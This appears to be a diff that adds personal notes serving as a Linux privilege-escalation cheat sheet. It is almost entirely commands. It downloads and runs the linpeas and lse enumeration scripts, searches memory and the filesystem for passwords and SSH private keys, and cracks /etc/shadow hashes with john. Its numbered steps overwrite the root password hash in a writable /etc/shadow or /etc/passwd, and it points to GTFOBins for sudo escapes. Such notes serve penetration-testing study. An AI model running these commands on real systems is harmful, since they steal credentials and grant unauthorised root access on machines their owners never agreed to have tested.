@@ -1,0 +1,44 @@
+Tools:
+
+wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
+curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
+./linpeas.sh -a 
+./linpeas.sh -s 
+./linpeas.sh -P
+
+wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
+curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
+./lse.sh -l1 
+./lse.sh -l2
+
+find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+strings /dev/mem -n10 | grep -i PASS
+locate password | more  
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+
+Link : https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/
+
+
+01: Readable /etc/shadow:
+cat /etc/shadow
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+su root
+
+02: writeable /etc/shadow:
+ls -l /etc/shadow
+mkpasswd -m sha-512 iloveislam
+edit the /etc/shadow and replace hash
+
+03:Writable /etc/passwd:
+ls -l /etc/passwd
+openssl passwd newpasswordhere
+Edit the /etc/passwd and replacing the "x"
+su root
+
+04: Shell Escape Sequences :
+sudo - l
+then go to https://gtfobins.github.io
+
+link : https://github.com/foysalhossain12/-Linux-Privilege-Escalation
+https://github.com/foysalhossain12/LinEnum
